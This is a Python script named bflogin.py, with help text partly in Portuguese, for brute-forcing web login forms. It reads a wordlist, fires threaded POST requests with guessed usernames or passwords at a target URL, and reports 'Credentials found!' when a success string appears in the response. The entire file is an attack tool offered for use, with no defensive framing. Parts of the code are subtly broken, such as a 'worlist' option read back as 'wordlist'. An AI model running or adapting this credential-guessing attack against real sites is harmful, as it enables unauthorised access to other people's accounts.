import requests, time, threading, logging, json, datetime
import configparser
import platform
import os.path
import time
import os
from optparse import OptionError
from optparse import OptionGroup
from optparse import OptionParser
from optparse import SUPPRESS_HELP

usage = "python3 bflogin.py [options]"
parser = OptionParser(usage=usage, epilog='Exemplo: python3 bflogin.py --help')
parser.add_option("--version", dest="version", action="store_true",
    help="Show version")
parser.add_option('-o', dest="output", help='File save requests')
parser.add_option('-v', dest='verbose', action="store_true", help="Activate mode verbose")
parser.add_option('-u', '--url', metavar='url', dest='url', help="url for attack")

request = OptionGroup(parser, 'Request',
    'Config params for attack')

request.add_option('--timeout', dest='timeout', type=float, help='Time in request (default 0.2s)')
request.add_option('--worlist', dest='worlist', help='Location wordlist')
request.add_option('--show-wordlist', dest='sworlist', action="store_true", help='Show wordlists')
request.add_option('--user', dest='user', help='Username no formdata')
request.add_option('--passwd', dest='passwd', help='Password no formdata')
request.add_option('--param', dest='param', help='Parametro a ser testado')
request.add_option('--diff', dest='diff', help='String esperada para autenticação')

parser.add_option_group(request)
(options, args) = parser.parse_args()

try:
    import requests
except ImportError:
    raise Exception("Requests not instaled -> http://docs.python-requests.org")

def Attest(response):
    if ( options.diff in response.text ):
        return True
    else:
        return False

def Auth(user, passwd):
    try:
        params[dlogin] = user
        params[dpass] = passwd
        response = requests.post(url=url, data=params)
        if Attest(response):
            print(' ~> Credentials found! <~')
            print(params)
            logging.info('hit ~>'+str(params))
            exit(0)
        else:
            logging.info(str(params))
    except ConnectionError:
        print('A Connection error occurred.')
    except KeyboardInterrupt:
        print('Keyboard Interrupt')


if __name__ == '__main__':
    if options.sworlist:
        os.system("tree -fn ../wordlists/")
        exit(0)

    try:
        file = open(options.wordlist, 'r')
        words = list(map(lambda x: x.replace('\n', ''), file.readlines()))
        print('~> wordlist com {} palavras.'.format(len(words)))
    except:
        print('Não foi possível abrir o arquivo.')

    outputfile = 'bflogin_' + str(datetime.datetime.now().timestamp())
    logging.basicConfig(level=logging.INFO, filename='syslog/' + outputfile,
        format='%(asctime)s : %(message)s', filemode='w', datefmt='%m/%d %H:%I:%M:%S')

    init = time.time()
    params = {}
    url = options.url
    dlogin = options.user
    dpass = options.passwd
    trequest = options.timeout
    wordlist = options.wordlist

    if options.param == 'user':
        default = input('password ~> ')
    else:
        default = input('username ~> ')

    count = 0
    num = int(len(words) / 10)
    valor = 0
    for word in words:
        if count == num:
            print('~> ' + str(valor) + '%')
            valor += 10
            count = 0
        else:
            count += 1

        if options.param == 'user':
            x = threading.Thread(target=Auth, args=(word, default))
        else:
            x = threading.Thread(target=Auth, args=(default, word))
        x.start()
        time.sleep(trequest)

    print('exec time ~> ' + str(time.time() - init))
